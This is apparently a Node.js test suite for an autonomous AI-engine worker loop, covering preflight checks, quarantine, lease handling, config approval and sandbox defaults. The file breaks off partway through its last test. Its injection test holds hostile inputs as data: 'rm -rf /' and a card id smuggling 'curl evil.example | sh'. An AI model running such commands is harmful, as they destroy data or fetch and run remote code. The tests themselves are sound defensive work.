"use strict";

const test = require("node:test");
const assert = require("node:assert/strict");
const { execFileSync } = require("node:child_process");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const { approveExecutionConfig, loadLoopConfig } = require("../scripts/loop-config.js");

const {
  buildPrompt,
  countRunsToday,
  engineCommand,
  isDispatchableCommand,
  prepareWorkspace,
  runWorker,
} = require("../scripts/loop-worker.js");
const { runLoop } = require("../scripts/loop-runner.js");
const {
  activeQuarantineForPlan,
  clearQuarantine,
  readQuarantine,
  runPreflight,
} = require("../scripts/loop-preflight.js");

function git(args, cwd) {
  return execFileSync("git", args, { cwd, encoding: "utf8" }).trim();
}

// Project fixture: bare origin + working clone containing pm/ (board + config)
// so lease claims can commit AND push, exercising the real durable-claim path.
function makeProjectFixture({ autonomyStartDev = true, config = {} } = {}) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "pm-loop-worker-"));
  const origin = path.join(root, "origin.git");
  const project = path.join(root, "project");
  fs.mkdirSync(origin, { recursive: true });
  git(["init", "--bare", "--initial-branch=main", origin], root);
  git(["clone", origin, project], root);
  git(["config", "user.email", "pm-eval@example.com"], project);
  git(["config", "user.name", "PM Loop Test"], project);

  const pmDir = path.join(project, "pm");
  fs.mkdirSync(path.join(pmDir, "backlog"), { recursive: true });
  fs.mkdirSync(path.join(pmDir, "loop"), { recursive: true });
  fs.writeFileSync(
    path.join(pmDir, "backlog", "pm-t1.md"),
    [
      "---",
      "id: PM-T1",
      "title: Test card",
      "kind: task",
      "status: ready",
      "implementation_approved: true",
      "approved_by: PM Test",
      "approved_at: 2026-07-01",
      "---",
      "",
      "Do the thing.",
    ].join("\n") + "\n"
  );
  // Safety: default engine is /usr/bin/true so no test can ever invoke a
  // real vendor CLI; dispatch-reaching tests override engine_bin explicitly.
  const loopConfig = {
    autonomy: { start_dev: autonomyStartDev },
    worker: { keep_workspace: true, engine_bin: "/usr/bin/true" },
    ...config,
  };
  fs.writeFileSync(
    path.join(pmDir, "loop", "config.json"),
    JSON.stringify(loopConfig, null, 2) + "\n"
  );
  fs.writeFileSync(path.join(project, "README.md"), "fixture\n");
  // A gitignored-but-required file, mirroring the worktree-first-push failure.
  fs.writeFileSync(path.join(project, ".gitignore"), "local.env\n");
  fs.writeFileSync(path.join(project, "local.env"), "SECRET_SETTING=1\n");
  git(["add", "-A"], project);
  git(["commit", "-m", "fixture"], project);
  git(["push", "origin", "main"], project);
  git(["symbolic-ref", "HEAD", "refs/heads/main"], origin);

  approveExecutionConfig(path.join(project, ".pm"), loadLoopConfig(pmDir));

  return {
    root,
    project,
    pmDir,
    cleanup: () => fs.rmSync(root, { recursive: true, force: true }),
  };
}

function approveFixtureConfig(fixture) {
  return approveExecutionConfig(path.join(fixture.project, ".pm"), loadLoopConfig(fixture.pmDir));
}

function writeFakeEngine(root, { exitCode = 0, marker = "engine-ran" } = {}) {
  const binPath = path.join(root, "fake-engine");
  fs.writeFileSync(
    binPath,
    [
      "#!/usr/bin/env node",
      'const fs = require("node:fs");',
      'let input = "";',
      'process.stdin.setEncoding("utf8");',
      'process.stdin.on("data", (c) => { input += c; });',
      'process.stdin.on("end", () => {',
      `  fs.writeFileSync("${marker}.txt", input);`,
      '  fs.writeFileSync("engine-env.json", JSON.stringify({ worker: process.env.PM_LOOP_WORKER, stage: process.env.PM_LOOP_STAGE, card: process.env.PM_LOOP_CARD_ID }));',
      '  console.log("fake engine done");',
      `  process.exit(${exitCode});`,
      "});",
      "",
    ].join("\n")
  );
  fs.chmodSync(binPath, 0o755);
  return binPath;
}

function writeDevCompleteEngine(root, { marker = "engine-ran" } = {}) {
  const binPath = path.join(root, "fake-dev-complete-engine");
  fs.writeFileSync(
    binPath,
    [
      "#!/usr/bin/env node",
      'const fs = require("node:fs");',
      'const path = require("node:path");',
      'let input = "";',
      'process.stdin.setEncoding("utf8");',
      'process.stdin.on("data", (c) => { input += c; });',
      'process.stdin.on("end", () => {',
      `  fs.writeFileSync("${marker}.txt", input);`,
      '  fs.writeFileSync("engine-env.json", JSON.stringify({ worker: process.env.PM_LOOP_WORKER, stage: process.env.PM_LOOP_STAGE, card: process.env.PM_LOOP_CARD_ID }));',
      '  const cardPath = path.join(process.cwd(), "pm", "backlog", "pm-t1.md");',
      '  const body = ["---", "id: PM-T1", "title: Test card", "kind: task", "status: shipping", "implementation_approved: true", "approved_by: PM Test", "approved_at: 2026-07-01", "branch: loop/pm-t1", "prs:", "  - \\"#123\\"", "---", "", "Do the thing.", ""].join("\\n");',
      "  fs.writeFileSync(cardPath, body);",
      '  console.log("fake dev engine done");',
      "});",
      "",
    ].join("\n")
  );
  fs.chmodSync(binPath, 0o755);
  return binPath;
}

test("engineCommand maps engines and honors custom bin override", () => {
  const codex = engineCommand({ default_runtime: "codex", worker: {} }, "p");
  assert.equal(codex.bin, "codex");
  assert.ok(codex.args.includes("exec"));
  assert.ok(codex.args.includes("--sandbox"));
  assert.ok(codex.args.includes("workspace-write"));
  assert.ok(!codex.args.includes("--full-auto"));

  const codexDanger = engineCommand(
    { default_runtime: "codex", worker: { codex_sandbox: "danger-full-access" } },
    "p"
  );
  assert.ok(codexDanger.args.includes("danger-full-access"));

  const claude = engineCommand({ default_runtime: "codex", worker: { engine: "claude" } }, "p");
  assert.equal(claude.bin, "claude");
  assert.ok(claude.args.includes("-p"));
  // Safe default: no permission bypass unless the operator opts in explicitly.
  assert.ok(claude.args.includes("acceptEdits"));
  assert.ok(!claude.args.includes("bypassPermissions"));

  const bypass = engineCommand(
    {
      default_runtime: "codex",
      worker: { engine: "claude", claude_permission_mode: "bypassPermissions" },
    },
    "p"
  );
  assert.ok(bypass.args.includes("bypassPermissions"));

  const custom = engineCommand(
    { default_runtime: "codex", worker: { engine_bin: "/x/bin", engine_args: ["--a"] } },
    "p"
  );
  assert.equal(custom.bin, "/x/bin");
  assert.deepEqual(custom.args, ["--a"]);
  assert.throws(
    () => engineCommand({ worker: { engine_args: ["-s", "danger-full-access"] } }, "p"),
    /must not contain --sandbox/
  );
});

test("codex engine capability adds only explicit dirs and the private result directory", (t) => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "pm-loop-engine-capability-"));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const workspacePath = path.join(root, "workspace");
  const pmDir = path.join(root, "knowledge", "pm");
  const pmStateDir = path.join(root, "knowledge", ".pm");
  const resultDir = path.join(root, "results", "run-1");
  const explicitDir = path.join(root, "approved-cache");
  for (const dir of [workspacePath, pmDir, pmStateDir, resultDir, explicitDir]) {
    fs.mkdirSync(dir, { recursive: true });
  }

  const command = engineCommand({ worker: { codex_add_dirs: [explicitDir] } }, "probe", {
    workspacePath,
    pmDir,
    pmStateDir,
    resultDir,
  });
  const added = command.args
    .map((arg, index) => (arg === "--add-dir" ? command.args[index + 1] : null))
    .filter(Boolean);
  assert.deepEqual(added.sort(), [explicitDir, resultDir].sort());
  assert.ok(!added.includes(pmDir));
  assert.ok(!added.includes(pmStateDir));
});

test("preflight bootstraps a disposable detached worktree, runs service checks, and probes the exact engine", () => {
  const fixture = makeProjectFixture();
  try {
    const pmStateDir = path.join(fixture.project, ".pm");
    const config = {
      version: 2,
      default_runtime: "codex",
      autonomy: { start_dev: true },
      worker: {
        engine_bin: "/usr/bin/true",
        bootstrap_required_files: ["local.env"],
      },
      preflight: {
        probe_timeout_seconds: 5,
        quarantine_ttl_seconds: 60,
        service_checks: [{ name: "bootstrap-present", command: "test -f local.env" }],
      },
    };
    const plan = runLoop(fixture.project, {
      pmDir: fixture.pmDir,
      config,
      dryRun: true,
      mode: "dev",
    });
    let observed;
    const result = runPreflight(fixture.project, plan, config, {
      pmDir: fixture.pmDir,
      pmStateDir,
      runProbe(context) {
        observed = context;
        assert.equal(context.command.bin, "/usr/bin/true");
        assert.equal(fs.statSync(context.resultDir).mode & 0o777, 0o700);
        assert.equal(git(["rev-parse", "HEAD"], context.workspacePath), plan.source_base_oid);
        assert.ok(fs.existsSync(path.join(context.workspacePath, "local.env")));
        assert.ok(fs.existsSync(path.join(context.contextDir, "card.md")));
        return { status: 0, stdout: "ok", stderr: "" };
      },
    });

    assert.equal(result.ok, true, JSON.stringify(result));
    assert.ok(observed);
    assert.equal(fs.existsSync(observed.workspacePath), false, "disposable worktree removed");
    assert.equal(fs.existsSync(observed.resultDir), false, "private probe result dir removed");
    assert.equal(
      fs.readdirSync(path.join(fixture.project, ".worktrees")).length,
      0,
      "preflight leaves no worktree"
    );
  } finally {
    fixture.cleanup();
  }
});

test("preflight fails closed and quarantines when disposable cleanup cannot be verified", () => {
  const fixture = makeProjectFixture();
  try {
    const config = {
      version: 2,
      autonomy: { start_dev: true },
      worker: { engine_bin: "/usr/bin/true" },
      preflight: { service_checks: [] },
    };
    const plan = runLoop(fixture.project, {
      pmDir: fixture.pmDir,
      config,
      dryRun: true,
      mode: "dev",
    });
    const result = runPreflight(fixture.project, plan, config, {
      pmDir: fixture.pmDir,
      pmStateDir: path.join(fixture.project, ".pm"),
      runProbe: () => ({ status: 0, stdout: "", stderr: "" }),
      removeWorktree: () => false,
    });

    assert.equal(result.ok, false);
    assert.equal(result.blocker_code, "preflight-cleanup-failed");
    assert.equal(result.quarantine.fingerprint, plan.fingerprint);
  } finally {
    fixture.cleanup();
  }
});

test("preflight never follows an RFC symlink outside the protected PM backlog", () => {
  const fixture = makeProjectFixture();
  try {
    const cardPath = path.join(fixture.pmDir, "backlog", "pm-t1.md");
    fs.writeFileSync(
      cardPath,
      fs
        .readFileSync(cardPath, "utf8")
        .replace("---\n\nDo the thing.", "rfc: rfcs/secret.html\n---\n\nDo the thing.")
    );
    const outside = path.join(fixture.root, "outside-rfcs");
    fs.mkdirSync(outside);
    fs.writeFileSync(path.join(outside, "secret.html"), "host secret\n");
    fs.symlinkSync(outside, path.join(fixture.pmDir, "backlog", "rfcs"));
    git(["add", "pm/backlog/pm-t1.md", "pm/backlog/rfcs"], fixture.project);
    git(["commit", "-m", "add RFC context"], fixture.project);
    git(["push"], fixture.project);

    const config = {
      version: 2,
      autonomy: { start_dev: true },
      worker: { engine_bin: "/usr/bin/true" },
      preflight: { service_checks: [] },
    };
    const plan = runLoop(fixture.project, {
      pmDir: fixture.pmDir,
      config,
      dryRun: true,
      mode: "dev",
    });
    const result = runPreflight(fixture.project, plan, config, {
      pmDir: fixture.pmDir,
      pmStateDir: path.join(fixture.project, ".pm"),
      runProbe({ contextDir }) {
        assert.equal(fs.existsSync(path.join(contextDir, "rfc.html")), false);
        return { status: 0, stdout: "", stderr: "" };
      },
    });

    assert.equal(result.ok, true, JSON.stringify(result));
  } finally {
    fixture.cleanup();
  }
});

test("invalid preflight plans fail without trying to create an unkeyed quarantine", () => {
  const fixture = makeProjectFixture();
  try {
    assert.doesNotThrow(() => {
      const result = runPreflight(
        fixture.project,
        {},
        { version: 2 },
        {
          pmDir: fixture.pmDir,
          pmStateDir: path.join(fixture.project, ".pm"),
        }
      );
      assert.equal(result.blocker_code, "preflight-plan-invalid");
      assert.equal(result.quarantine, undefined);
    });
  } finally {
    fixture.cleanup();
  }
});

test("preflight protects PM refs and protected-path status across the bounded probe", () => {
  const fixture = makeProjectFixture();
  try {
    const config = {
      version: 2,
      default_runtime: "codex",
      autonomy: { start_dev: true },
      worker: { engine_bin: "/usr/bin/true" },
      preflight: { probe_timeout_seconds: 5, quarantine_ttl_seconds: 60, service_checks: [] },
    };
    const plan = runLoop(fixture.project, {
      pmDir: fixture.pmDir,
      config,
      dryRun: true,
      mode: "dev",
    });
    const result = runPreflight(fixture.project, plan, config, {
      pmDir: fixture.pmDir,
      pmStateDir: path.join(fixture.project, ".pm"),
      runProbe() {
        fs.appendFileSync(path.join(fixture.pmDir, "backlog", "pm-t1.md"), "probe mutation\n");
        return { status: 0, stdout: "", stderr: "" };
      },
    });

    assert.equal(result.ok, false);
    assert.equal(result.blocker_code, "protected-pm-state-changed");
    assert.match(result.remediation, /restore PM refs and protected paths/i);
  } finally {
    fixture.cleanup();
  }
});

test("preflight failure creates no branch or lease and writes fingerprint-keyed local quarantine", () => {
  const fixture = makeProjectFixture();
  try {
    const pmStateDir = path.join(fixture.project, ".pm");
    const firstCard = path.join(fixture.pmDir, "backlog", "pm-t1.md");
    fs.writeFileSync(
      firstCard,
      fs
        .readFileSync(firstCard, "utf8")
        .replace("status: ready", "status: ready\npriority: critical")
    );
    fs.writeFileSync(
      path.join(fixture.pmDir, "backlog", "pm-t2.md"),
      [
        "---",
        "id: PM-T2",
        "title: Later card",
        "kind: task",
        "priority: low",
        "status: ready",
        "implementation_approved: true",
        "approved_by: PM Test",
        "approved_at: 2026-07-01",
        "---",
        "",
        "Later work.",
        "",
      ].join("\n")
    );
    git(["add", "pm/backlog"], fixture.project);
    git(["commit", "-m", "add lower priority card"], fixture.project);
    git(["push"], fixture.project);
    const config = {
      version: 2,
      default_runtime: "codex",
      autonomy: { start_dev: true },
      worker: {
        engine_bin: "/usr/bin/true",
        bootstrap_required_files: ["missing-required.env"],
      },
      preflight: { probe_timeout_seconds: 5, quarantine_ttl_seconds: 60, service_checks: [] },
    };
    const plan = runLoop(fixture.project, {
      pmDir: fixture.pmDir,
      config,
      dryRun: true,
      mode: "dev",
    });
    const beforeHead = git(["rev-parse", "HEAD"], fixture.project);
    const beforeBranches = git(
      ["for-each-ref", "--format=%(refname)", "refs/heads"],
      fixture.project
    );
    const beforeStatus = git(["status", "--porcelain", "--", "pm"], fixture.project);

    const result = runPreflight(fixture.project, plan, config, {
      pmDir: fixture.pmDir,
      pmStateDir,
    });

    assert.equal(result.ok, false);
    assert.equal(result.blocker_code, "bootstrap-required-file-missing");
    assert.equal(git(["rev-parse", "HEAD"], fixture.project), beforeHead);
    assert.equal(
      git(["for-each-ref", "--format=%(refname)", "refs/heads"], fixture.project),
      beforeBranches
    );
    assert.equal(git(["status", "--porcelain", "--", "pm"], fixture.project), beforeStatus);
    assert.equal(fs.existsSync(path.join(fixture.pmDir, "loop", "leases")), false);

    const quarantine = readQuarantine(pmStateDir, plan.fingerprint, new Date());
    assert.equal(quarantine.fingerprint, plan.fingerprint);
    assert.equal(quarantine.blocker_code, "bootstrap-required-file-missing");
    assert.match(quarantine.remediation, /missing-required\.env/);

    const nextPlan = runLoop(fixture.project, {
      pmDir: fixture.pmDir,
      config,
      dryRun: true,
      mode: "dev",
      quarantineCheck: (_card, meta) => activeQuarantineForPlan(pmStateDir, meta),
    });
    assert.equal(nextPlan.selected.id, "PM-T2", "quarantine leaves later work eligible");

    fs.appendFileSync(firstCard, "fingerprint changed\n");
    git(["add", "pm/backlog/pm-t1.md"], fixture.project);
    git(["commit", "-m", "change first card fingerprint"], fixture.project);
    git(["push"], fixture.project);
    const retriedPlan = runLoop(fixture.project, {
      pmDir: fixture.pmDir,
      config,
      dryRun: true,
      mode: "dev",
      quarantineCheck: (_card, meta) => activeQuarantineForPlan(pmStateDir, meta),
    });
    assert.equal(retriedPlan.selected.id, "PM-T1", "fingerprint change permits retry");

    assert.equal(clearQuarantine(pmStateDir, plan.fingerprint), 1);
    assert.equal(readQuarantine(pmStateDir, plan.fingerprint, new Date()), null);
  } finally {
    fixture.cleanup();
  }
});

test("execution worktree is promoted from the fingerprinted source base instead of moving origin", () => {
  const fixture = makeProjectFixture();
  try {
    const config = {
      version: 2,
      default_runtime: "codex",
      autonomy: { start_dev: true },
      worker: {},
      preflight: { service_checks: [] },
    };
    const plan = runLoop(fixture.project, {
      pmDir: fixture.pmDir,
      config,
      dryRun: true,
      mode: "dev",
    });
    fs.writeFileSync(path.join(fixture.project, "after-plan.txt"), "new tip\n");
    git(["add", "after-plan.txt"], fixture.project);
    git(["commit", "-m", "advance source after plan"], fixture.project);
    git(["push"], fixture.project);
    assert.notEqual(git(["rev-parse", "HEAD"], fixture.project), plan.source_base_oid);

    const workspace = prepareWorkspace(fixture.project, plan, config, {
      now: new Date("2026-07-02T10:00:00Z"),
    });
    assert.equal(workspace.ok, true, JSON.stringify(workspace));
    assert.equal(git(["rev-parse", "HEAD"], workspace.workspacePath), plan.source_base_oid);
    assert.equal(fs.existsSync(path.join(workspace.workspacePath, "after-plan.txt")), false);
  } finally {
    fixture.cleanup();
  }
});

test("countRunsToday counts only same-day ledgers and fails closed on bad JSON", () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pm-loop-runs-"));
  try {
    const now = new Date("2026-07-02T10:00:00Z");
    fs.writeFileSync(
      path.join(dir, "a.json"),
      JSON.stringify({ started_at: "2026-07-02T01:00:00Z" })
    );
    fs.writeFileSync(
      path.join(dir, "b.json"),
      JSON.stringify({ started_at: "2026-07-01T23:00:00Z" })
    );
    fs.writeFileSync(path.join(dir, "c.json"), "{broken");
    assert.equal(countRunsToday(dir, now), 2);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
});

test("kill switch stops the worker before any claim", () => {
  const fixture = makeProjectFixture();
  try {
    fs.writeFileSync(path.join(fixture.pmDir, "loop", "STOP"), "halt\n");
    const result = runWorker(fixture.project, { pmDir: fixture.pmDir });
    assert.equal(result.status, "stopped");
    assert.equal(fs.readdirSync(path.join(fixture.pmDir, "loop")).includes("leases"), false);
  } finally {
    fixture.cleanup();
  }
});

test("daily budget blocks the worker before any claim", () => {
  const fixture = makeProjectFixture();
  try {
    const runsDir = path.join(path.dirname(fixture.pmDir), ".pm", "loop-runs");
    fs.mkdirSync(runsDir, { recursive: true });
    const today = new Date().toISOString();
    for (let i = 0; i < 12; i += 1) {
      fs.writeFileSync(path.join(runsDir, `r${i}.json`), JSON.stringify({ started_at: today }));
    }
    const result = runWorker(fixture.project, { pmDir: fixture.pmDir });
    assert.equal(result.status, "budget-exhausted");
  } finally {
    fixture.cleanup();
  }
});

test("dry-run previews selection and engine command without claiming", () => {
  const fixture = makeProjectFixture();
  try {
    const result = runWorker(fixture.project, { pmDir: fixture.pmDir, dryRun: true });
    assert.equal(result.status, "dry-run");
    assert.equal(result.selected.id, "PM-T1");
    assert.ok(result.engine.bin);
    assert.equal(fs.existsSync(path.join(fixture.pmDir, "loop", "leases")), false);
  } finally {
    fixture.cleanup();
  }
});

test("unapproved execution config fails before claim and quarantines the exact plan", () => {
  const fixture = makeProjectFixture();
  try {
    fs.writeFileSync(
      path.join(fixture.pmDir, "loop", "config.json"),
      JSON.stringify(
        {
          version: 2,
          autonomy: { start_dev: true },
          worker: { engine_bin: "/usr/bin/false", codex_sandbox: "danger-full-access" },
        },
        null,
        2
      )
    );
    git(["add", "pm/loop/config.json"], fixture.project);
    git(["commit", "-m", "change unapproved engine authority"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, { pmDir: fixture.pmDir });
    assert.equal(result.status, "preflight-failed");
    assert.equal(result.blocker_code, "execution-config-unapproved");
    assert.equal(result.mutation, false);
    assert.equal(fs.existsSync(path.join(fixture.pmDir, "loop", "leases")), false);
    assert.equal(result.quarantine.fingerprint, result.fingerprint);
  } finally {
    fixture.cleanup();
  }
});

test("worker validates a remote-only config change instead of executing stale local policy", () => {
  const fixture = makeProjectFixture();
  const clone = path.join(fixture.root, "remote-config-update");
  try {
    git(["clone", path.join(fixture.root, "origin.git"), clone], fixture.root);
    git(["config", "user.email", "remote@example.com"], clone);
    git(["config", "user.name", "Remote Config"], clone);
    fs.writeFileSync(
      path.join(clone, "pm", "loop", "config.json"),
      JSON.stringify(
        {
          autonomy: { start_dev: true },
          worker: { engine_bin: "/usr/bin/false", codex_sandbox: "danger-full-access" },
        },
        null,
        2
      )
    );
    git(["add", "pm/loop/config.json"], clone);
    git(["commit", "-m", "remote-only policy change"], clone);
    git(["push"], clone);

    const result = runWorker(fixture.project, { pmDir: fixture.pmDir });
    assert.equal(result.status, "preflight-failed");
    assert.equal(result.blocker_code, "execution-config-unapproved");
    assert.equal(result.mutation, false);
    assert.equal(fs.existsSync(path.join(fixture.pmDir, "loop", "leases")), false);
  } finally {
    fixture.cleanup();
  }
});

test("worker honors an explicit PM state directory for machine-local approval", () => {
  const fixture = makeProjectFixture();
  try {
    const customState = path.join(fixture.root, "host-state");
    fs.writeFileSync(
      path.join(fixture.pmDir, "loop", "config.json"),
      JSON.stringify(
        {
          autonomy: { start_dev: true },
          worker: {
            engine_bin: "/usr/bin/true",
            bootstrap_required_files: ["missing-for-preflight.env"],
          },
        },
        null,
        2
      )
    );
    fs.rmSync(path.join(fixture.project, ".pm", "loop-host.json"), { force: true });
    approveExecutionConfig(customState, loadLoopConfig(fixture.pmDir));
    git(["add", "pm/loop/config.json"], fixture.project);
    git(["commit", "-m", "configure explicit host state"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, {
      pmDir: fixture.pmDir,
      pmStateDir: customState,
    });
    assert.equal(result.status, "preflight-failed");
    assert.equal(result.blocker_code, "bootstrap-required-file-missing");
    assert.equal(result.quarantine.file_path.startsWith(customState), true);
  } finally {
    fixture.cleanup();
  }
});

test("worker never treats generic options.config as a trusted runtime config", () => {
  const fixture = makeProjectFixture();
  try {
    fs.writeFileSync(
      path.join(fixture.pmDir, "loop", "config.json"),
      JSON.stringify({
        autonomy: { start_dev: true },
        worker: { engine_bin: "/usr/bin/false", codex_sandbox: "danger-full-access" },
      })
    );
    fs.rmSync(path.join(fixture.project, ".pm", "loop-host.json"), { force: true });
    git(["add", "pm/loop/config.json"], fixture.project);
    git(["commit", "-m", "unapproved persisted config"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, {
      pmDir: fixture.pmDir,
      config: {
        ...loadLoopConfig(fixture.pmDir),
        worker: { engine_bin: "/usr/bin/true" },
      },
    });
    assert.equal(result.status, "preflight-failed");
    assert.equal(result.blocker_code, "execution-config-unapproved");
    assert.equal(fs.existsSync(path.join(fixture.pmDir, "loop", "leases")), false);
  } finally {
    fixture.cleanup();
  }
});

test("worker executes the engine in a bootstrapped worktree and releases the lease", () => {
  const fixture = makeProjectFixture();
  try {
    const engineBin = writeDevCompleteEngine(fixture.root);
    fs.writeFileSync(
      path.join(fixture.pmDir, "loop", "config.json"),
      JSON.stringify(
        {
          autonomy: { start_dev: true },
          worker: {
            engine_bin: engineBin,
            bootstrap_files: ["local.env"],
            keep_workspace: true,
          },
        },
        null,
        2
      )
    );
    approveFixtureConfig(fixture);
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "config"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, { pmDir: fixture.pmDir });
    assert.equal(result.status, "completed", JSON.stringify(result));
    assert.equal(result.card.id, "PM-T1");

    // Engine ran inside the worktree with the prompt on stdin
    const markerPath = path.join(result.workspace, "engine-ran.txt");
    const prompt = fs.readFileSync(markerPath, "utf8");
    assert.match(prompt, /PM-T1/);
    assert.match(prompt, /do NOT merge/);

    // Gitignored-but-required file was copied into the fresh worktree
    assert.ok(fs.existsSync(path.join(result.workspace, "local.env")));

    // Skills detect loop mode deterministically via env
    const engineEnv = JSON.parse(
      fs.readFileSync(path.join(result.workspace, "engine-env.json"), "utf8")
    );
    assert.equal(engineEnv.worker, "1");
    assert.equal(engineEnv.stage, "dev");
    assert.equal(engineEnv.card, "PM-T1");

    // Lease released (file gone) and the release was pushed
    assert.equal(fs.existsSync(path.join(fixture.pmDir, "loop", "leases")), false);

    // Crash-safe ledger records the completed run
    const ledger = JSON.parse(fs.readFileSync(result.ledger, "utf8"));
    assert.equal(ledger.status, "completed");
    assert.equal(ledger.exit_code, 0);
    assert.ok(ledger.lease_release.released);
    git(["fetch", "origin"], fixture.project);
    const event = JSON.parse(
      git(["show", `origin/main:pm/loop/events/${result.run_id}.json`], fixture.project)
    );
    assert.equal(event.status, "released");
    assert.equal(event.terminal, true);
    assert.equal(
      git(["log", "--format=%s", "origin/main", "-3"], fixture.project).includes(
        "pm loop dispatched PM-T1 dev"
      ),
      true
    );
  } finally {
    fixture.cleanup();
  }
});

test("worker fails closed when the terminal release CAS is not durable", () => {
  const fixture = makeProjectFixture();
  try {
    const engineBin = writeDevCompleteEngine(fixture.root);
    fs.writeFileSync(
      path.join(fixture.pmDir, "loop", "config.json"),
      JSON.stringify({
        autonomy: { start_dev: true },
        worker: { engine_bin: engineBin, keep_workspace: true },
      })
    );
    approveFixtureConfig(fixture);
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "config"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, {
      pmDir: fixture.pmDir,
      releaseClaim() {
        return { ok: false, pushed: false, reason: "push-race" };
      },
    });

    assert.equal(result.status, "finalization-blocked", JSON.stringify(result));
    assert.equal(result.reason, "lease release was not durably confirmed: push-race");
    const ledger = JSON.parse(fs.readFileSync(result.ledger, "utf8"));
    assert.equal(ledger.status, "finalization-blocked");
    assert.equal(ledger.lease_release.reason, "push-race");
  } finally {
    fixture.cleanup();
  }
});

test("dev-stage exit 0 without shipping metadata is blocked, not completed", () => {
  const fixture = makeProjectFixture();
  try {
    const engineBin = writeFakeEngine(fixture.root);
    fs.writeFileSync(
      path.join(fixture.pmDir, "loop", "config.json"),
      JSON.stringify(
        {
          autonomy: { start_dev: true },
          worker: {
            engine_bin: engineBin,
            keep_workspace: true,
          },
        },
        null,
        2
      )
    );
    approveFixtureConfig(fixture);
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "config"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, { pmDir: fixture.pmDir });
    assert.equal(result.exit_code, 0);
    assert.equal(result.status, "blocked", JSON.stringify(result));
    assert.match(result.reason, /dev completion contract/);

    const ledger = JSON.parse(fs.readFileSync(result.ledger, "utf8"));
    assert.equal(ledger.status, "blocked");
    assert.match(ledger.reason, /status=shipping/);
  } finally {
    fixture.cleanup();
  }
});

test("engine failure records a failed ledger and still releases the lease", () => {
  const fixture = makeProjectFixture();
  try {
    const engineBin = writeFakeEngine(fixture.root, { exitCode: 3 });
    fs.writeFileSync(
      path.join(fixture.pmDir, "loop", "config.json"),
      JSON.stringify({ autonomy: { start_dev: true }, worker: { engine_bin: engineBin } }, null, 2)
    );
    approveFixtureConfig(fixture);
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "config"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, {
      pmDir: fixture.pmDir,
      runProbe: () => ({ status: 0, stdout: "", stderr: "" }),
    });
    assert.equal(result.status, "failed");
    assert.equal(result.exit_code, 3);
    assert.equal(fs.existsSync(path.join(fixture.pmDir, "loop", "leases")), false);
    const ledger = JSON.parse(fs.readFileSync(result.ledger, "utf8"));
    assert.equal(ledger.status, "failed");
  } finally {
    fixture.cleanup();
  }
});

test("crash recovery: an expired orphan lease fails closed without duplicate engine execution", () => {
  const fixture = makeProjectFixture();
  try {
    const engineBin = writeDevCompleteEngine(fixture.root);
    fs.writeFileSync(
      path.join(fixture.pmDir, "loop", "config.json"),
      JSON.stringify(
        { autonomy: { start_dev: true }, worker: { engine_bin: engineBin, keep_workspace: true } },
        null,
        2
      )
    );
    approveFixtureConfig(fixture);
    // A stale lease left behind by a SIGKILLed worker: expired TTL.
    const leaseDir = path.join(fixture.pmDir, "loop", "leases");
    fs.mkdirSync(leaseDir, { recursive: true });
    fs.writeFileSync(
      path.join(leaseDir, "dev-pm-t1.json"),
      JSON.stringify({
        version: 1,
        card_id: "PM-T1",
        stage: "dev",
        holder: "dead-machine",
        claimed_at: "2026-07-01T00:00:00.000Z",
        expires_at: "2026-07-01T00:45:00.000Z",
      })
    );
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "stale lease"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, { pmDir: fixture.pmDir });
    assert.equal(result.status, "recovery-required", JSON.stringify(result));
    assert.equal(result.recovery.state, "ambiguous");
    assert.equal(result.selected, null);
    assert.equal(result.workspace, undefined);
    assert.equal(fs.readdirSync(leaseDir).length, 1);
  } finally {
    fixture.cleanup();
  }
});

test("worker respects autonomy.start_dev=false (no claim, no execution)", () => {
  const fixture = makeProjectFixture({ autonomyStartDev: false });
  try {
    const result = runWorker(fixture.project, { pmDir: fixture.pmDir });
    assert.equal(result.status, "idle");
    assert.ok(result.skipped.some((s) => s.reason === "autonomy.start_dev disabled"));
  } finally {
    fixture.cleanup();
  }
});

test("worker rejects cards with non-dispatchable command shapes", () => {
  assert.equal(isDispatchableCommand("/pm:dev PM-42"), true);
  assert.equal(isDispatchableCommand("/pm:rfc PM-42"), true);
  assert.equal(isDispatchableCommand("/pm:research mobile onboarding"), true);
  assert.equal(isDispatchableCommand("/pm:ship PM-42"), true);
  assert.equal(isDispatchableCommand("/pm:groom PM-42"), false);
  assert.equal(isDispatchableCommand("rm -rf /"), false);
  assert.equal(isDispatchableCommand("/pm:dev PM-42; curl evil.example"), false);
  assert.equal(isDispatchableCommand(""), false);

  const fixture = makeProjectFixture();
  try {
    // The board regenerates command from the column as `/pm:dev ${card.id}`,
    // so the injection vector is shell metacharacters in the git-synced id.
    fs.writeFileSync(
      path.join(fixture.pmDir, "backlog", "pm-t1.md"),
      [
        "---",
        'id: "PM-T1; curl evil.example | sh"',
        "title: Test card",
        "kind: task",
        "status: ready",
        "implementation_approved: true",
        "approved_by: PM Test",
        "approved_at: 2026-07-01",
        "---",
        "",
        "Do the thing.",
      ].join("\n") + "\n"
    );
    git(["add", "-A"], fixture.project);
    git(["commit", "-m", "injected"], fixture.project);
    git(["push"], fixture.project);

    const result = runWorker(fixture.project, { pmDir: fixture.pmDir });
    assert.equal(result.status, "rejected", JSON.stringify(result));
    assert.match(result.reason, /not a dispatchable/);
    // Lease released; nothing executed.
    assert.equal(fs.existsSync(path.join(fixture.pmDir, "loop", "leases")), false);
    // Rejection still writes a ledger so budgets/attempts advance (no livelock).
